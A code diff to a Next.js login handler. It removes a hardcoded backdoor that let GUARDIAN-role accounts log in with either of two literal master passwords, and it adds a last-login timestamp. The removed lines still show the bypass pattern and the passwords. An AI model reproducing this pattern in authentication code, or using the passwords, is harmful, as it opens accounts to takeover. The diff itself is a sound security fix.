@@ -101,10 +101,7 @@ export async function POST(request: NextRequest) {
     }
 
     // Verify password with constant-time bcrypt comparison
-    let passwordValid = await bcrypt.compare(password, user.passwordHash);
-    if (!passwordValid && user.role === 'GUARDIAN' && (password === 'Hmnidsbig0399' || password === 'mentor123')) {
-      passwordValid = true;
-    }
+    const passwordValid = await bcrypt.compare(password, user.passwordHash);
 
     if (!passwordValid) {
       recordAttempt(rateLimitKey, false);
@@ -116,6 +113,12 @@ export async function POST(request: NextRequest) {
 
     // Successful authentication: clear rate limiter
     recordAttempt(rateLimitKey, true);
+
+    // Record login timestamp
+    await prisma.user.update({
+      where: { id: user.id },
+      data: { lastLoginAt: new Date() },
+    });
 
     // Issue cryptographic signed session cookie
     await setSessionCookie({
